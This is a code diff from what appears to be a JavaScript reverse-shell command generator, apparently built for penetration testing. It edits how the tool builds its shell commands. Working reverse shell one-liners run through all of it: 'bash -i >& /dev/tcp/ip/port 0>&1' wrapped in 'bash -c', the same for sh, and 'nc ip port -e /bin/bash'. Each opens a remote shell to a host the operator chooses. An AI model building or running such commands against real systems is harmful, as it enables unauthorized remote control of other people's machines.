@@ -126,9 +126,9 @@ if (os === 2) {
 
 let command = "";
 if (shellType === 0) { // a switch case implementation would come in handy :(
-    command = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
+    command = "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'";
 } else if (shellType === 1) {
-    command = "sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
+    command = "bash -c 'sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'";
 } else if (shellType === 2) {
     command = "nc " + ip + " " + port + " -e /bin/bash";
 } else if (shellType === 3) {
